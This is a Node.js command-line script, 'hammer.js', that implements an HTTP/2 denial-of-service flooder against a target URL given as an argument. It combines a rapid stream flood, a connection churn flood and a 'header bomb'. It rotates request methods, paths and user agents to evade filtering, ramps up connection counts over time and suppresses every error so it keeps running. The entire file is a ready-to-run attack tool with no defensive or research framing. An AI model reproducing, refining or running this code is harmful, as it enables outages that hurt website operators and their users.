const http2 = require('http2');

class H2_HAMMER {
    constructor(target) {
        this.target = target;
        this.host = target.replace('https://', '').split('/')[0];
        this.running = true;
        
        console.log('STARTED');
        
        // ROTATE METHODS
        this.methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
        this.paths = ['/', '/api', '/admin', '/wp-login.php', '/index.html'];
        this.userAgents = [
            'Mozilla/5.0',
            'curl/7.68.0',
            'python-requests/2.25.1',
            'Go-http-client/1.1'
        ];
        
        // DYNAMIC CONNECTION POOL
        this.activeConns = 10; // START WITH 10
        this.connections = [];
        
        // START ATTACK CYCLES
        this.startCycles();
        
        // AUTO-RESTART EVERY 15s (BEFORE TARGET RECOVERS)
        setInterval(() => {
            this.rotateConnections();
        }, 15000);
    }
    
    startCycles() {
        // METHOD 1: HTTP/2 STREAM FLOOD
        setInterval(() => {
            this.floodStreams();
        }, 100);
        
        // METHOD 2: NEW CONNECTION FLOOD
        setInterval(() => {
            this.floodNewConns();
        }, 5000);
        
        // METHOD 3: HEADER BOMB
        setInterval(() => {
            this.headerBomb();
        }, 3000);
    }
    
    floodStreams() {
        try {
            // USE EXISTING CONNECTIONS
            this.connections.forEach(conn => {
                if (conn && !conn.destroyed) {
                    for (let i = 0; i < 50; i++) {
                        const req = conn.request({
                            ':method': this.randomChoice(this.methods),
                            ':path': this.randomChoice(this.paths) + '?' + Math.random(),
                            ':authority': this.host,
                            'user-agent': this.randomChoice(this.userAgents)
                        });
                        
                        // RANDOM PAYLOAD SIZE
                        if (Math.random() > 0.5) {
                            req.write('x'.repeat(Math.floor(Math.random() * 1024) + 1));
                        }
                        req.end();
                        
                        // DESTROY AFTER RANDOM TIME
                        setTimeout(() => {
                            try { req.close(); } catch(e) {}
                        }, Math.random() * 100);
                    }
                }
            });
        } catch(e) {}
    }
    
    floodNewConns() {
        // CREATE NEW CONNECTIONS CONSTANTLY
        for (let i = 0; i < 5; i++) {
            this.createConnection();
        }
        
        // DESTROY OLD CONNECTIONS
        this.connections = this.connections.filter(conn => {
            if (conn && !conn.destroyed) {
                if (Math.random() > 0.7) { // 30% CHANCE TO KILL
                    try { conn.destroy(); } catch(e) {}
                    return false;
                }
                return true;
            }
            return false;
        });
    }
    
    headerBomb() {
        try {
            // HEADER OVERLOAD ATTACK
            this.connections.forEach(conn => {
                if (conn && !conn.destroyed) {
                    const headers = {
                        ':method': 'GET',
                        ':path': '/',
                        ':authority': this.host
                    };
                    
                    // ADD MANY RANDOM HEADERS
                    for (let i = 0; i < 20; i++) {
                        headers['x-header-' + i] = 'x'.repeat(100);
                    }
                    
                    const req = conn.request(headers);
                    req.end();
                }
            });
        } catch(e) {}
    }
    
    createConnection() {
        try {
            const conn = http2.connect(this.target, {
                maxSessionMemory: 32768,
                settings: {
                    initialWindowSize: 2147483647,
                    maxConcurrentStreams: 100
                }
            });
            
            // QUICK DESTROY ON ERROR
            conn.on('error', () => {
                try { conn.destroy(); } catch(e) {}
            });
            
            // DESTROY AFTER RANDOM TIME
            setTimeout(() => {
                try { conn.destroy(); } catch(e) {}
            }, Math.random() * 10000 + 5000);
            
            this.connections.push(conn);
            return conn;
        } catch(e) {
            return null;
        }
    }
    
    rotateConnections() {
        // DESTROY ALL OLD CONNECTIONS
        this.connections.forEach(conn => {
            try { if (conn) conn.destroy(); } catch(e) {}
        });
        
        this.connections = [];
        
        // CREATE FRESH BATCH
        for (let i = 0; i < this.activeConns; i++) {
            this.createConnection();
        }
        
        // INCREASE INTENSITY
        this.activeConns = Math.min(50, this.activeConns + 5);
    }
    
    randomChoice(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }
    
    stop() {
        this.running = false;
        this.connections.forEach(conn => {
            try { if (conn) conn.destroy(); } catch(e) {}
        });
    }
}

// RUN
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv[2]) {
    const hammer = new H2_HAMMER(process.argv[2]);
    
    process.on('SIGINT', () => {
        hammer.stop();
        process.exit(0);
    });
} else {
    console.log('node hammer.js https://target.com');
}
